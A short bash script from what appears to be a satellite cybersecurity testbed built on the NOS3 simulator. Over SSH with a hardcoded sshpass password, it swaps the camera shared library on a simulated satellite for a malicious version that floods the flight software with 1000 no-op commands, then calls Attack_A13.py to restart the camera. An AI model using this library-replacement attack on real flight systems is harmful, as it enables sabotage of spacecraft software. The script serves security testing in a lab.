#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

# arducam_flood_log.so has been compiled on SAT1
# aim : send flooding from a malicious camera on the cFS with CFS_NOOP command 1000 times
# command to trigger : CAM_HW_CHECK_CC

/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "rm /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"
/usr/bin/sshpass -p nos3123! scp arducam_flood_log.so nos3@$IPSAT1:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_flood_log.so    # for more realistic attack use CFDP TC (not working with NOS3 v1.6.2)
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "mv /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_flood_log.so /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"

now="$(date +"%T")"
echo "$now : replaced the cam .so to flood"

#restart the camera for the new .so to take effect
python3 Attack_A13.py

## NB: don't forget to reset nominal version of .so after the attack !


    
    





